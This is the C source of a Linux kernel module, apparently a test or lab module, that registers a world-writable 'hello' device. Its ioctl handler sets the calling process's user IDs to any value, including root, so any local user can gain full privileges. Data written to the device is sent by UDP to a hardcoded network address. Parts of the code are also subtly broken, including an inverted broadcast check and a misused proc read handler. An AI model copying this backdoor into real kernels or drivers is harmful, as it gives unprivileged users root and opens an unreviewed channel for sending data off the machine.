#include <linux/init.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <asm/uaccess.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/inet.h>
#include <net/udp.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/mutex.h>

struct test_ip_ioctl_request {
	uint16_t port;
	char ip[255];
};

#define TEST_SU_IOCTL _IO(150, 1)
#define TEST_IP_IOCTL _IOR(150, 2, struct test_ip_ioctl_request)

DEFINE_MUTEX(mtx);
int enable_su = 0;

static struct socket *sock = NULL;

static struct {
  int family;
  union {
    struct sockaddr_in6 ip6;
    struct sockaddr_in ip4;
  } ip;
} dest;

static int change_ip(const char *val) {
  const char *p;
  int ret;
  int family;
  printk("changing: %s\n", val);

  family = AF_INET;
  p = val;
  while(*p) {
    if(*p == ':') {
      family = AF_INET6;
      break;
    }
    p++;
  }

  if(sock) {
    sock_release(sock);
    sock = NULL;
  }

  ret = sock_create(family, SOCK_DGRAM, IPPROTO_UDP, &sock);
  if(ret < 0) {
    return ret;
  }

  if(family == AF_INET6) {
    if(!in6_pton(val, -1, dest.ip.ip6.sin6_addr.s6_addr, -1, NULL)) {
      return -EADDRNOTAVAIL;
    }
    dest.ip.ip6.sin6_family = AF_INET6;
    dest.ip.ip6.sin6_port = htons(12345);
  } else if(family == AF_INET) {
    if(!in4_pton(val, -1, (char*) &dest.ip.ip4.sin_addr.s_addr, -1, NULL)) {
      return -EADDRNOTAVAIL;
    }
    dest.ip.ip4.sin_family = AF_INET;
    dest.ip.ip4.sin_port = htons(12345);

    if(strcmp(val, "255.255.255.255")) {
      sock_set_flag(sock->sk, SOCK_BROADCAST);
    }	
  } else {
    return -ENOTSUPP;
  }
  dest.family = family;

  return ret;
}

static ssize_t hello_read(struct file * file, char * buf, 
    size_t count, loff_t *ppos)
{
  return 0;
}

static ssize_t hello_write(struct file * file, const char * buffer,
    size_t count, loff_t *ppos)
{
  void *buf;
  ssize_t ret;
  struct msghdr msg;
  struct iov_iter iov_iter;
  struct kvec kvec;

  buf = kmalloc(count, GFP_KERNEL);
  if(!buf) {
    return -ENOMEM;
  }

  if(copy_from_user(buf,buffer,count)) {
    ret = -EFAULT;
    goto err;
  }

  kvec.iov_base = buf;
  kvec.iov_len = count;

  iov_iter.type = ITER_KVEC;
  iov_iter.iov_offset = 0;
  iov_iter.count = kvec.iov_len;
  iov_iter.kvec = &kvec;
  iov_iter.nr_segs = 1;

  msg.msg_name = &dest.ip;
  msg.msg_namelen = sizeof(dest.ip);
  msg.msg_controllen = 0;
  msg.msg_flags = 0;
  msg.msg_iocb = 0;
  msg.msg_iter = iov_iter;

  ret = sock_sendmsg(sock, &msg);
  ret = count;

err:
  kfree(buf);

  return ret;
}

long hello_su(int uid) {
  struct cred* new_cred;
	kuid_t v = {uid};

	printk("changing user to %d\n", uid);

  new_cred = prepare_creds();
  if(!new_cred) {
    printk("failed to create creds\n");
    return -ENOTTY;
  }

  new_cred->uid = v;
	new_cred->euid = v;
	new_cred->fsuid = v;

  return commit_creds(new_cred);
}

long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
	struct test_ip_ioctl_request req;
  switch(cmd) {
    case TEST_SU_IOCTL:
      return hello_su(arg);

		case TEST_IP_IOCTL:
			if(copy_from_user(&req, arg, sizeof(req))) {
				return -EFAULT;
			}

			// dont trust userspace!
			req.ip[sizeof(req.ip) - 1] = 0;

			printk("changing to %s:%d\n", req.ip, req.port);
			return change_ip(req.ip);
  }

  return -ENOTTY;
}

static int hello_show(struct seq_file *m, void *v) {
	seq_printf(m, "%d", enable_su);
	return 0;
}

static ssize_t hello_proc_read(struct file * file, char * buf, size_t count, loff_t *ppos) {
	return single_open(file, hello_show, NULL);
}

static ssize_t hello_proc_write(struct file * file, const char * buf, size_t count, loff_t *ppos) {
	char b;
	if(copy_from_user(&b, buf, 1)) {
		return -EFAULT;
	}

	enable_su = b == '1';
	printk("su is now: %d\n", enable_su);
	return count;
}

static const struct file_operations hello_fops = {
  .owner		= THIS_MODULE,
  .read		= hello_read,
  .write		= hello_write,
  .unlocked_ioctl = hello_ioctl,
};

static struct miscdevice hello_dev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "hello",
  .fops = &hello_fops,
  .mode = 0666,
};



static const struct file_operations hello_proc_fops = {
	.owner = THIS_MODULE,
	.read = hello_proc_read,
	.write = hello_proc_write,
};

static int __init
hello_init(void)
{
  int ret;

  ret = misc_register(&hello_dev);
  if (ret) {
    printk("unable to register device");
    return 1;
  }

	proc_create("enable_su", 0666, NULL, &hello_proc_fops);
  change_ip("192.168.1.2");

  return ret;
}

module_init(hello_init);

  static void __exit
hello_exit(void)
{
  misc_deregister(&hello_dev);
	remove_proc_entry("enable_su", NULL);
}

module_exit(hello_exit);

MODULE_LICENSE("GPL");
